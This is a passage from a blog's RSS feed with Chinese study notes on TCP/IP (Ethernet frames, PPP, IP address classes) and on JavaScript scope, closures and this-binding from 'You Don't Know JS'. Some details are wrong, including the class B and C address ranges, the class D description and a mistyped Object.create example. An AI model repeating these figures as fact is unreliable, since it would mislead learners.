<p>紧随帧头后面的是数据。一个数据帧所能容纳的最大数据范围是 46~1500 个字节。帧尾是一个叫做 FCS (Frame Check Sequence，帧检验序列)的 4 个字节。FCS 具有较强的检错能力，能够检测出大量的突发错误。</p>
</blockquote>
</li>
</ul>
<img :src="$withBase('/images/TCP-IP/以太网帧格式.png')" loading="lazy">
<h2 id="_13-无线通信"> 13. 无线通信</h2>
<img :src="$withBase('/images/TCP-IP/无线通信分类及其性质.png')" loading="lazy">
<h2 id="_14-ppp"> 14. PPP</h2>
<ul>
<li>哈哈！小时候的拨号上网！ - PPPoE</li>
</ul>
<img :src="$withBase('/images/TCP-IP/PPP中建立连接.png')" loading="lazy">
<h2 id="_15-ip-即网际协议"> 15. IP 即网际协议</h2>
<img :src="$withBase('/images/TCP-IP/IP的作用与数据链路的作用.png')" loading="lazy">
<h2 id="_16-ip-基础知识"> 16. IP 基础知识</h2>
<ul>
<li>
<p>为什么 IP 要采用面向无连接呢?</p>
<blockquote>
<p>主要有两点原因：一是为了简化，二是为了提速。面向连接比起面向无连接处理相对复杂。甚至管理每个连接本身就是一个相当繁琐的事情。此外，每次通信之前都要事先建立连接，又会降低处理速度。需要有连接时，可以委托上一层提供此项服务。因此，IP 为了实现简单化与高速化采用面向无连接的方式。</p>
</blockquote>
</li>
</ul>
<h2 id="_17-ip-地址的基础知识"> 17. IP 地址的基础知识</h2>
<ul>
<li>
<p>IP 地址由 “网络标识（网络地址）” 和 “主机标识（主机地址）” 两部分组成。主机标识不允许在同一网段内重复出现。</p>
<blockquote>
<p>192.168.128.10/24 中的 “/24” 表示从第 1 位开始到多少位属于网络标识。在这个例子中，192.168.128 之前的都是该 IP 的网络地址。</p>
</blockquote>
</li>
<li>
<p>IP 地址的分类。</p>
<blockquote>
<ul>
<li>A 类地址：A 类 IP 地址是首位以 “0” 开头的地址。从第 1 位到第 8 位是它的网络标识。用十进制表示的话，0.0.0.0~127.0.0.0 是 A 类的网络地址。A 类地址的后 24 位相当于主机标识。因此，一个网段内可容纳的主机地址上限为 16,777,214 个。</li>
<li>B 类地址：B 类 IP 地址是前两位为 “10” 的地址。从第 1 位到第 16 位是它的网络标识。用十进制表示的话，128.0.0.1~191.255.0.0 是 B 类的网络地址。B 类地址的后 16 位相当于主机标识。因此，一个网段内可容纳的主机地址上限为 65,534 个。</li>
<li>C 类地址：C 类 IP 地址是前三位为 “110” 的地址。从第 1 位到第 24 位是它的网络标识。用十进制表示的话，192.168.0.0~239.255.255.0 是 C 类的网络地址。C 类地址的后 8 位相当于主机标识。因此，一个网段内可容纳的主机地址上限为 254 个。</li>
<li>D 类地址：D 类 IP 地址是前四位为 “1110” 的地址。从第 1 位到第 32 位是它的网络标识。用十进制表示的话，224.0.0.0~239.255.255.255 是 D 类的网络地址。D 类地址没有主机标识，常被用于多播。</li>
</ul>
</blockquote>
<p>在分配 IP 地址时关于主机标识有一点需要注意。即要用比特位表示主机地址时，不可以全部为 0 或全部为 1。因为全部为 0 在表示对应的网络地址或 IP 地址不可获知的情况下才使用。而全部为 1 的主机地址通常作为广播地址。
因此，在分配过程中，应该去掉这两种情况。这也是为什么 C 类地址每个网段最多只能有 254 个主机地址的原因。</p>
</li>
</ul>
<h2 id="待续"> 待续...</h2>
]]></content:encoded>
    </item>
    <item>
      <title>你不知道的 JS（上）</title>
      <link>https://www.matrixtheone.ga/web/note/books/You-Don%E2%80%99t-Know-JS-Vol1/</link>
      <guid>https://www.matrixtheone.ga/web/note/books/You-Don%E2%80%99t-Know-JS-Vol1/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">你不知道的 JS（上）</source>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-编译原理"> 1. 编译原理</h2>
<ul>
<li>
<p>编译：分词/词法分析 -&gt; 解析/语法分析 -&gt; 代码生成。</p>
<blockquote>
<p>分词/词法分析：将由字符组成的字符串分解成（对编程语言来说）有意义的代码块，这些代码块称为词法单元。</p>
</blockquote>
<div><pre><code>代码示意
<span>var</span> a <span>=</span> <span>2</span><span>;</span>  分析为  <span>var</span>、a、<span>=</span>、<span>2</span>、<span>;</span>
</code></pre>
<div><span>1</span><br><span>2</span><br></div></div><blockquote>
<p>解析/语法分析：将词法单元流（数组）转换成一个由元素逐级嵌套所组成的代表了程序语法结构的树（AST）。</p>
</blockquote>
<div><pre><code>可能的代码示意
<span>VariableDeclaration</span><span>:</span> <span>{</span>
  <span>Identifier</span><span>:</span> a<span>,</span>
  <span>AssignmentExpression</span><span>:</span> <span>{</span>
    <span>NumericLiteral</span><span>:</span> <span>2</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></div></div><blockquote>
<p>代码生成：将 AST 转换为可执行代码的过程被称为代码生成。</p>
</blockquote>
</li>
</ul>
<h2 id="_2-lhs-与-rhs"> 2. LHS 与 RHS</h2>
<ul>
<li>
<p>RHS 查询与简单地查找某个变量的值别无二致，而 LHS 查询则是试图找到变量的容器本身，从而可以对其赋值。</p>
</li>
<li>
<p>最好将其理解为 “赋值操作的目标是谁（LHS）” 以及 “谁是赋值操作的源头（RHS）”。</p>
</li>
</ul>
<h2 id="_3-编译器有话说小测验"> 3. 编译器有话说小测验</h2>
<ul>
<li>找出所有的 LHS 与 RHS 查询。</li>
</ul>
<div><pre><code><span>function</span> <span>foo</span><span>(</span><span>a</span><span>)</span> <span>{</span>
  <span>var</span> b <span>=</span> a
  <span>return</span> a <span>+</span> b
<span>}</span>

<span>var</span> c <span>=</span> <span>foo</span><span>(</span><span>2</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></div></div><blockquote>
<ul>
<li>LHS 查询（3 处）：c = ..、a = 2（隐式变量分配）、b = ..</li>
<li>RHS 查询（4 处）：foo(2..、= a、a ..、.. b</li>
</ul>
</blockquote>
<h2 id="_4-作用域是什么"> 4. 作用域是什么</h2>
<ul>
<li>
<p>LHS 和 RHS 查询都会在当前执行作用域中开始，如果有需要（也就是说它们没有找到所需的标识符），就会向上级作用域继续查找目标标识符，这样每次上升一级作用域（一层楼），最后抵达全局作用域（顶层），无论找到或没找到都将停止。</p>
</li>
<li>
<p>不成功的 RHS 引用会导致抛出 ReferenceError 异常。不成功的 LHS 引用会导致自动隐式地创建一个全局变量（非严格模式下），该变量使用 LHS 引用的目标作为标识符，或者抛出 ReferenceError 异常（严格模式下）。</p>
</li>
</ul>
<h2 id="_5-词法作用域与动态作用域"> 5. 词法作用域与动态作用域</h2>
<ul>
<li>主要区别：词法作用域是在写代码或者说定义时确定的，而动态作用域是在运行时确定。（this 也是! ）词法作用域关注函数在何处声明，而动态作用域关注函数从何处调用。</li>
</ul>
<div><pre><code><span>function</span> <span>foo</span><span>(</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span>a<span>)</span> <span>// 词法作用域打印2，动态作用域打印3</span>
<span>}</span>

<span>function</span> <span>bar</span><span>(</span><span>)</span> <span>{</span>
  <span>var</span> a <span>=</span> <span>3</span>
  <span>foo</span><span>(</span><span>)</span>
<span>}</span>

<span>var</span> a <span>=</span> <span>2</span>
<span>bar</span><span>(</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div><h2 id="_6-欺骗词法"> 6. 欺骗词法</h2>
<ul>
<li>
<p>JavaScript 中有两个机制可以 “欺骗” 词法作用域: eval(..) 和 with。前者可以对一段包含一个或多个声明的 “代码” 字符串进行演算，并借此来修改已经存在的词法作用域（在运行时）。后者本质上是通过将一个对象的引用当作作用域来处理，将对象的属性当作作用域中的标识符来处理，从而创建了一个新的词法作用域（同样是在运行时）。</p>
<ul>
<li>eval()。</li>
</ul>
<div><pre><code><span>function</span> <span>foo</span><span>(</span><span>str<span>,</span> a</span><span>)</span> <span>{</span>
  <span>eval</span><span>(</span>str<span>)</span>
  console<span>.</span><span>log</span><span>(</span>a<span>,</span> b<span>)</span> <span>// 1, 3</span>
<span>}</span>

<span>var</span> b <span>=</span> <span>2</span>
<span>foo</span><span>(</span><span>'var b = 3'</span><span>,</span> <span>1</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></div></div><ul>
<li>with。</li>
</ul>
<div><pre><code><span>function</span> <span>foo</span><span>(</span><span>obj</span><span>)</span> <span>{</span>
  <span>with</span> <span>(</span>obj<span>)</span> <span>{</span>
    a <span>=</span> <span>2</span>
  <span>}</span>
<span>}</span>

<span>var</span> o1 <span>=</span> <span>{</span>
  <span>a</span><span>:</span> <span>3</span><span>,</span>
<span>}</span>

<span>var</span> o2 <span>=</span> <span>{</span>
  <span>b</span><span>:</span> <span>3</span><span>,</span>
<span>}</span>

<span>foo</span><span>(</span>o1<span>)</span>
console<span>.</span><span>log</span><span>(</span>o1<span>.</span>a<span>)</span> <span>// 2</span>

<span>foo</span><span>(</span>o2<span>)</span>
console<span>.</span><span>log</span><span>(</span>o2<span>.</span>a<span>)</span> <span>// undefined</span>
console<span>.</span><span>log</span><span>(</span>a<span>)</span> <span>// 2 -> a被泄露到全局作用域上了！</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br></div></div></li>
</ul>
<h2 id="_7-立即执行函数表达式-iife"> 7. 立即执行函数表达式-IIFE</h2>
<div><pre><code><span>;</span><span>(</span><span>function</span> <span>foo</span><span>(</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>777</span><span>)</span>
<span>}</span><span>)</span><span>(</span><span>)</span>

<span>;</span><span>(</span><span>function</span> <span>foo</span><span>(</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>777</span><span>)</span>
<span>}</span><span>(</span><span>)</span><span>)</span>

<span>!</span><span>function</span> <span>foo</span><span>(</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>777</span><span>)</span>
<span>}</span><span>(</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div><h2 id="_8-try-catch"> 8. try / catch</h2>
<ul>
<li>catch 分句会创建一个块作用域，其中的声明的变量仅在 catch 内部有效。</li>
</ul>
<div><pre><code><span>try</span> <span>{</span>
  <span>undefined</span><span>(</span><span>)</span>
<span>}</span> <span>catch</span> <span>(</span>err<span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span>err<span>)</span>
<span>}</span>

console<span>.</span><span>log</span><span>(</span>err<span>)</span> <span>// ReferenceError: err is not defined</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></div></div><h2 id="_9-闭包"> 9. 闭包</h2>
<ul>
<li>
<p>产生原因：我们在词法作用域的环境下写代码，而其中的函数也是值，可以随意传来传去。</p>
</li>
<li>
<p>产生闭包：当函数可以记住并访问所在的词法作用域，即使函数是在当前词法作用域之外执行，这时就产生了闭包。</p>
</li>
</ul>
<div><pre><code><span>function</span> <span>foo</span><span>(</span><span>)</span> <span>{</span>
  <span>var</span> a <span>=</span> <span>1</span>
  <span>// var b = 1</span>
  <span>return</span> <span>function</span> <span>bar</span><span>(</span><span>)</span> <span>{</span>
    <span>// debugger // b 被销毁</span>
    a<span>++</span>
    console<span>.</span><span>log</span><span>(</span>a<span>)</span>
  <span>}</span>
<span>}</span>

<span>var</span> bar <span>=</span> <span>foo</span><span>(</span><span>)</span>
<span>bar</span><span>(</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><div><pre><code><span>function</span> <span>wait</span><span>(</span><span>message</span><span>)</span> <span>{</span>
  <span>setTimeout</span><span>(</span><span>function</span> <span>timer</span><span>(</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span>message<span>)</span>
  <span>}</span><span>,</span> <span>1000</span><span>)</span>
<span>}</span>

<span>wait</span><span>(</span><span>'Hello，closure！'</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></div></div><h2 id="_10-显示绑定"> 10. 显示绑定</h2>
<ul>
<li>如果你传入了一个原始值（字符串类型、布尔类型或者数字类型）来当作 this 的绑定对象，这个原始值会被转换成它的对象形式（也就是 new String(..)、new Boolean(..)、new Number(..)）。这通常被称为 “装箱”。</li>
</ul>
<div><pre><code><span>function</span> <span>foo</span><span>(</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>this</span><span>.</span>TheOne<span>)</span>
<span>}</span>
<span>Number</span><span>.</span>prototype<span>.</span>TheOne <span>=</span> <span>'NEO'</span>
<span>String</span><span>.</span>prototype<span>.</span>TheOne <span>=</span> <span>'NEO'</span>
<span>Boolean</span><span>.</span>prototype<span>.</span>TheOne <span>=</span> <span>'NEO'</span>
<span>foo</span><span>.</span><span>call</span><span>(</span><span>7</span><span>)</span>
<span>foo</span><span>.</span><span>apply</span><span>(</span><span>'Matrix'</span><span>)</span>
<span>foo</span><span>.</span><span>bind</span><span>(</span><span>true</span><span>)</span>

<span>7.</span><span>.</span>TheOne <span>// NEO</span>
<span>'Matrix'</span><span>.</span>TheOne <span>// NEO</span>
<span>true</span><span>.</span>TheOne <span>// NEO</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br></div></div><h2 id="_11-this-绑定规则"> 11. this 绑定规则</h2>
<ul>
<li>默认绑定</li>
</ul>
<div><pre><code><span>function</span> <span>foo</span><span>(</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>this</span><span>.</span>a<span>)</span> <span>// 2</span>
<span>}</span>

<span>var</span> a <span>=</span> <span>2</span>
<span>foo</span><span>(</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></div></div><ul>
<li>隐式绑定</li>
</ul>
<div><pre><code><span>function</span> <span>foo</span><span>(</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>this</span><span>.</span>a<span>)</span> <span>// 2</span>
<span>}</span>

<span>var</span> obj <span>=</span> <span>{</span>
  <span>a</span><span>:</span> <span>2</span><span>,</span>
  <span>foo</span><span>:</span> foo<span>,</span>
<span>}</span>

obj<span>.</span><span>foo</span><span>(</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div><ul>
<li>显示绑定</li>
</ul>
<div><pre><code><span>function</span> <span>foo</span><span>(</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>this</span><span>.</span>a<span>)</span> <span>// 2</span>
<span>}</span>

<span>var</span> obj <span>=</span> <span>{</span>
  <span>a</span><span>:</span> <span>2</span><span>,</span>
<span>}</span>

<span>foo</span><span>.</span><span>call</span><span>(</span>obj<span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br></div></div><ul>
<li>
<p>new 绑定。</p>
<ol>
<li>创建（或者说构造）一个全新的对象。</li>
<li>这个新对象会被执行[[Prototype]]连接。</li>
<li>这个新对象会绑定到函数调用的 this。</li>
<li>如果函数没有返回其他对象，那么 new 表达式中的函数调用会自动返回这个新对象。</li>
</ol>
</li>
</ul>
<div><pre><code><span>function</span> <span>Foo</span><span>(</span><span>a</span><span>)</span> <span>{</span>
  <span>this</span><span>.</span>a <span>=</span> a
<span>}</span>

<span>var</span> bar <span>=</span> <span>new</span> <span>Foo</span><span>(</span><span>2</span><span>)</span>
console<span>.</span><span>log</span><span>(</span>bar<span>.</span>a<span>)</span> <span>// 2</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></div></div><h2 id="_12-this-全面解析"> 12. this 全面解析</h2>
<ul>
<li>
<p>如果要判断一个运行中函数的 this 绑定，就需要找到这个函数的直接调用位置。找到之后就可以顺序应用下面这四条规则来判断 this 的绑定对象。</p>
<ol>
<li>由 new 调用？绑定到新创建的对象。</li>
<li>由 call 或者 apply（或者 bind）调用？绑定到指定的对象。</li>
<li>由上下文对象调用？绑定到那个上下文对象。</li>
<li>默认：在严格模式下绑定到 undefined, 否则绑定到全局对象。</li>
</ol>
</li>
<li>
<p>一定要注意，有些调用可能在无意中使用默认绑定规则。如果想 “更安全” 地忽略 this 绑定，你可以使用一个 DMZ 对象，比如 0 = object.create(null)，以保护全局对象。</p>
</li>
</ul>
<div><pre><code><span>function</span> <span>foo</span><span>(</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>this</span><span>.</span>a<span>)</span> <span>// 2</span>
<span>}</span>

<span>var</span> a <span>=</span> <span>2</span>
<span>foo</span><span>.</span><span>call</span><span>(</span><span>null</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></div></div><ul>
<li>ES6 中的箭头函数并不会使用四条标准的绑定规则，而是根据当前的词法作用域来决定 this，具体来说，箭头函数会继承外层函数调用的 this 绑定（无论 this 绑定到什么）。这其实和 ES6 之前代码中的 self = this 机制一样。</li>
</ul>
<h2 id="_13-原型"> 13. 原型</h2>
<img :src="$withBase('/images/JavaScript/原型链.png')" loading="lazy">]]></content:encoded>
    </item>
  </channel>
</rss>